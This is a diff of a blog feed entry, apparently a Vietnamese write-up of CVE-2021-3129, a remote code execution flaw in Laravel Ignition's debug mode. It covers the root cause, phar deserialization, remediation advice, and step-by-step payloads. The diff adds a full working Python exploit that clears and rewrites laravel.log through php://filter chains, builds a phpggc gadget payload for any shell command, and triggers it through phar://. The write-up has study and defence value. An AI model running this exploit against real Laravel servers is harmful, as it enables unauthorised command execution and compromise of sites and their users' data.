@@ -12,12 +12,12 @@
     <author>g03m0n</author>
     <guid>https://g03m0n.github.io/posts/cve-2021-3129/cve-2021-3129/</guid>
     <description><![CDATA[<h1 id="laravel--v842-debug-mode-remote-code-execution-cve-2021-3129"><strong>Laravel &lt;= v8.4.2 debug mode: Remote code execution (CVE-2021-3129)</strong></h1>
-<h1 id="description-and-impact"><strong>Description and Impact</strong></h1>
+<h1 id="description-and-impact">Description and Impact</h1>
 <p>Ignition là một công cụ gỡ lỗi phổ biến trong Laravel, đóng một vai trò quan trọng trong việc hỗ trợ các nhà phát triển trong quá trình phát triển ứng dụng. Nó được cài đặt mặc định từ Laravel 6+.</p>
 <p>Ngoài ra Ignition còn cung cấp các mô-đun hay còn gọi là  <code>Solutions</code> , giúp ta tìm và sửa lỗi một cách dễ dàng và nhanh chóng.</p>
 <p></p>
 <p>Tuy nhiên, chức năng của nó đi kèm với một lỗ hổng khiến các trang web sử dụng phiên bản Laravel &lt;= 8.4.2 với chế độ DEBUG được bật có nguy cơ bị tấn công RCE. Lỗ hổng nghiêm trọng này cho phép những kẻ tấn công không được xác thực thực thi mã tùy ý từ xa, có khả năng phá hoại dữ liệu ứng dụng, tài nguyên máy chủ và quyền riêng tư của người dùng.</p>
-<h1 id="root-cause-analysis"><strong>Root Cause Analysis</strong></h1>
+<h1 id="root-cause-analysis">Root Cause Analysis</h1>
 <h2 id="ignition-debug-example">Ignition debug example</h2>
 <p>Sửa hoặc thêm <code>{{ $varialbe }}</code> vào file <code>/resource/views/welcome.blade.php</code> để làm xuất hiện chế độ debug của <code>Ignition</code></p>
 <p></p>
@@ -34,7 +34,9 @@
 <h2 id="phar-deserialization">Phar Deserialization</h2>
 <h3 id="deserialize-attack">Deserialize Attack</h3>
 <p>Là kỹ thuật mà attacker có thể control được object serialize thông qua đó có thể điều chỉnh được các giá trị của các thuộc tính trong một class tuỳ theo ý muốn, đồng thời lợi dụng điểm yếu của các magic method để thực thi code và tấn công. Điển hình là các lỗi về: <code>SQL injection</code>, <code>Code injection</code>,…</p>
-<h3 id="phar-stream-wrapper"><strong>phar:// Stream Wrapper</strong></h3>
+<h3 id="phar">Phar</h3>
+<p>Phar là một phần mở rộng trong php, nó giống như 1 file zip và bên trong nó chứa mã nguồn php hoặc giống như một kho lưu trữ mã nguồn PHP, nghĩa là tập hợp include các file PHP vào chung 1 phar khi excute thì sẽ tự động thực thi toàn bộ các file PHP bên trong nó mà không cần phải extract các PHP đó vào một thư mục nào trước đó cả.</p>
+<h3 id="phar-stream-wrapper">phar:// Stream Wrapper</h3>
 <p>Trong PHP, tất cả các thao tác với tệp đều được xử lý bằng <a href="https://www.php.net/manual/en/intro.stream.php" target="_blank" rel="noopener noreffer">stream</a>
 .</p>
 <p>Bằng cách sử dụng các Wrapper, ta có thể gọi một số hàm tương tự như <code>filegetcontents()</code> **để nạp hình ảnh từ một vị trí ở xa hoặc từ một thư mục được lưu trữ trên local disk.</p>
@@ -45,8 +47,8 @@
 <li>filegetcontents(&ldquo;file://../images/image.jpeg&rdquo;)</li>
 <li>filegetcontents(&ldquo;phar://./folder/app.phar&rdquo;)</li>
 </ul>
-<p>Đặc biệt, phar:// stream wrapper được sử dụng để tương tác với các tệp PHAR. Nó cho phép thực hiện nhiều thao tác <code>read</code>/<code>write</code> khác nhau trên server.</p>
-<h3 id="phar-archives"><strong>PHAR archives</strong></h3>
+<p>Đặc biệt, phar:// stream wrapper được sử dụng để tương tác với các tệp PHAR. Nó cho phép ta thực hiện nhiều thao tác <code>read</code>/<code>write</code> khác nhau trên server. Ngoài ra ta còn có thể truy cập vào các file bên trong một file phar thông qua các <code>filesytstem function</code>.</p>
+<h3 id="phar-archives">PHAR archives</h3>
 <p>Cấu trúc của một file phar:</p>
 <p><strong><code>Stub</code>: Là một file PHP mà ta cần gói lại.</strong></p>
 <p>VD:   <strong><!-- raw HTML omitted --></strong></p>
@@ -63,7 +65,7 @@
 <p>Ta phải load được một file có nội dung tùy ý và biết được đường dẫn đến file này trong hệ thống. Tìm được một <code>filesystem function</code> trên để trigger file phar và đồng thời ta phải control được tên của file.</p>
 </li>
 </ul>
-<h2 id="root-cause-analysis-1"><strong>Root Cause Analysis</strong></h2>
+<h2 id="root-cause-analysis-1">Root Cause Analysis</h2>
 <p>Lỗ hổng xảy ra ở solution <code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code>. Tại đây, ứng dụng sử dụng hai hàm để <code>read</code> và <code>write</code> tệp trong PHP là: <code>file_get_contents()</code> và <code>file_put_contents()</code>. Sai lầm nghiêm trọng nằm ở việc thiếu xác thực trong việc kiểm tra input của người dùng, cụ thể là các biến môi trường được chuyển đến các chức năng này. Kẻ tấn công có thể khai thác lỗ hổng này bằng việc tiêm mã độc thông qua các biến môi trường, sau đó Ignition sẽ đọc và thực thi, cấp cho kẻ tấn công toàn quyền kiểm soát ứng dụng.</p>
 <p></p>
 <p>Luồng hoạt động của ứng dụng:</p>
@@ -184,7 +186,7 @@
 <p><code>print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in input()]).upper())</code>: chuyển từng ký tự thành mã Unicode của nó rồi chuyển mã Unicode thành mã Hex sau đó thêm ký tự &ldquo;=&rdquo; ở đầu và cuối mỗi chuỗi Hex và thêm chuỗi <code>00</code> ở cuối mỗi cặp Hex. Cuối cùng dùng hàm <code>join()</code> để ghép các chuỗi Hex thành một chuỗi duy nhất và dùng hàm <code>upper()</code> chuyển đổi tất cả các ký tự trong chuỗi thành ký tự in hoa.</p>
 </li>
 </ul>
-<h1 id="steps-to-reproduce"><strong>Steps to reproduce</strong></h1>
+<h1 id="steps-to-reproduce">Steps to reproduce</h1>
 <ol>
 <li>Đầu tiên, ta tiến hành xóa log trong file <code>laravel.log</code> bằng <code>consumed</code> filter.</li>
 </ol>
@@ -220,7 +222,8 @@
 <li><code>convert.quoted-printable-decode</code>: decode các string có giá trị là <code>=00</code> thành byte <code>\00</code>(NULL byte).</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php://filter/write=convert.quoted-printable-decode/resource=../storage/logs/laravel.log&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php://filter/write=convert.quoted-printable-decode
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">						/resource=../storage/logs/laravel.log&#34;</span>
 </span></span></code></pre></div><p></p>
 <ul>
 <li><code>convert.iconv.utf-16le.utf-8</code>: convert từ UTF-16 thành UTF-8 (chuyển đổi nội dung log không mong muốn bằng cách gộp 2 byte lại để chuyển thành các junk chars).</li>
@@ -244,7 +247,67 @@
 <p>Payload:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;phar:///var/www/storage/logs/laravel.log&#34;</span>
 </span></span></code></pre></div><p></p>
-<h1 id="recommendation"><strong>Recommendation</strong></h1>
+<ul>
+<li>
+<p>Script exploit tự động</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> sys<span style="color:#f92672">,</span> re<span style="color:#f92672">,</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse<span style="color:#f92672">,</span> urllib3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>urllib3<span style="color:#f92672">.</span>disable_warnings()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sendPayload</span>(payload):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:3333/_ignition/execute-solution&#34;</span>
+</span></span><span style="display:flex;"><span>    header <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;solution&#34;</span>: <span style="color:#e6db74">&#34;Facade</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Ignition</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Solutions</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">MakeViewVariableOptionalSolution&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;parameters&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;variableName&#34;</span>: <span style="color:#e6db74">&#34;variable&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;viewFile&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    data[<span style="color:#e6db74">&#34;parameters&#34;</span>][<span style="color:#e6db74">&#34;viewFile&#34;</span>] <span style="color:#f92672">=</span> payload
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, headers<span style="color:#f92672">=</span>header, json<span style="color:#f92672">=</span>data, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">500</span> <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;php.ini&#39;</span> <span style="color:#f92672">in</span> resp<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\{(.|\n)+\}((.|\n)*)&#39;</span>, resp<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Result: &#34;</span> , m[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> resp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clearLog</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sendPayload(<span style="color:#e6db74">&#34;php://filter/read=consumed/resource=../storage/logs/laravel.log&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decodeLog</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sendPayload(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unserializeLog</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sendPayload(<span style="color:#e6db74">&#34;phar://../storage/logs/laravel.log/test.txt&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">genPHPGGC</span>(command):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;php -d &#39;phar.readonly=0&#39; phpggc/phpggc monolog/rce1 system </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> --phar phar -o php://output | base64 -w0 | python -c &#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34; &gt; payload.txt&#34;&#34;&#34;</span><span style="color:#f92672">%</span>(command)
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;payload.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;a&#39;</span>
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;rm -r payload.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>    print (payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        command <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter command (or &#39;exit&#39; to quit): &#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> command<span style="color:#f92672">.</span>lower() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;exit&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        clearLog()
+</span></span><span style="display:flex;"><span>        sendPayload(<span style="color:#e6db74">&#39;AA&#39;</span>)
+</span></span><span style="display:flex;"><span>        sendPayload(genPHPGGC(command))
+</span></span><span style="display:flex;"><span>        decodeLog()
+</span></span><span style="display:flex;"><span>        unserializeLog()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div></li>
+</ul>
+<h1 id="recommendation">Recommendation</h1>
 <p>So sánh 2 file code, sau khi update Laravel đã thêm vào một hàm kiểm tra input của người dùng truyền qua param <code>viewFile</code> là <code>isSafePath()</code>. Hàm này có tác dụng kiểm tra xem input có bắt đầu bằng đường dẫn tuyệt đối <code>/</code>, đường dẫn tương đối <code>./</code> hoặc file có kết thúc bằng extention <code>blade.php</code> hay không, nếu không thì return <code>false</code>.</p>
 <p></p>
 <p>Nếu cần bật chế độ Debug trên môi trường non-local thì nên tắt chế độ Suggestion Solutions của Ignition bằng cách set <code>ignition.enable_runnable_solutions</code> thành <code>false</code> trong file <code>.env</code>.</p>
